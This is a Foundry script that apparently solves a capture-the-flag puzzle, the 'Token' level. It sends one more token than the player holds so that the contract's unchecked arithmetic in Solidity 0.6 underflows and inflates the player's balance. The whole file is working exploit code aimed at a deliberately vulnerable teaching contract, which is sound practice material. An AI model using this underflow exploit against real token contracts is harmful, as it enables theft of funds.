// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Token} from "../../src/puzzles/5/Token.sol";

contract TokenSolution is Script {
    function run(address target) public {
        solve(target, msg.sender);
    }

    function solve(address target, address player) public {
        Token puzzleContract = Token(target);
        uint256 balance = puzzleContract.balanceOf(player);
        uint256 overflowValue = balance + 1;

        vm.startBroadcast();
        puzzleContract.transfer(target, overflowValue);
        vm.stopBroadcast();
    }
}
